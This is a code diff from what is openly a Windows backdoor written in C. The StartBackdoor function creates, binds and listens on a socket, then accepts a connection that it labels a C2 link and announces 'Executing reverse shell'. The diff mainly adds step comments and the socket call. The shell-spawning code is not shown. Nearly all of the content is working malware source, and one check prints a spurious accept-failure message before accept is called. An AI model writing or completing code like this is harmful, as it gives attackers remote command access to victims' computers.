@@ -8,6 +8,8 @@ BOOL StartBackdoor(void) {
     printf("[DEBUG] StartBackdoor: Creating socket...\n");
     fflush(stdout);
 
+    // 1. Create socket
+    s = socket(AF_INET, SOCK_STREAM, 0);
     if (s == INVALID_SOCKET) {
         printf("[DEBUG] socket() failed: %lu\n", (unsigned long)s);
         printf("[BACKDOOR] Failed to create socket.\n");
@@ -17,6 +19,7 @@ BOOL StartBackdoor(void) {
     printf("[DEBUG] Socket created: %lu\n", (unsigned long)s);
     fflush(stdout);
 
+    // 2. Set socket options
     if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(int)) != 0) {
         printf("[DEBUG] setsockopt failed: %lu\n", (unsigned long)GetLastError());
     }
@@ -33,6 +36,7 @@ BOOL StartBackdoor(void) {
         address.sin_addr.s_addr = inet_addr(BACKDOOR_HOST);
     }
 
+    // 3. Bind socket
     if (bind(s, (struct sockaddr*)&address, sizeof(address)) != SOCKET_ERROR) {
         printf("[DEBUG] bind() succeeded\n");
         fflush(stdout);
@@ -41,6 +45,7 @@ BOOL StartBackdoor(void) {
         fflush(stdout);
     }
 
+    // 4. Listen on socket
     if (listen(s, SOCKET_BACKLOG) != SOCKET_ERROR) {
         printf("[DEBUG] listen() succeeded\n");
         fflush(stdout);
@@ -54,13 +59,12 @@ BOOL StartBackdoor(void) {
         Sleep(2000);
 
         // Accept connection
-        SOCKET client = INVALID_SOCKET;  // Initialize client
+        SOCKET client = INVALID_SOCKET;
         if (client == INVALID_SOCKET) {
             printf("[DEBUG] accept() failed: %lu\n", (unsigned long)client);
             fflush(stdout);
         }
 
-        // Accept connection
         client = accept(s, NULL, NULL);
         if (client != INVALID_SOCKET) {
             printf("[BACKDOOR] C2 Connected! Executing reverse shell...\n");
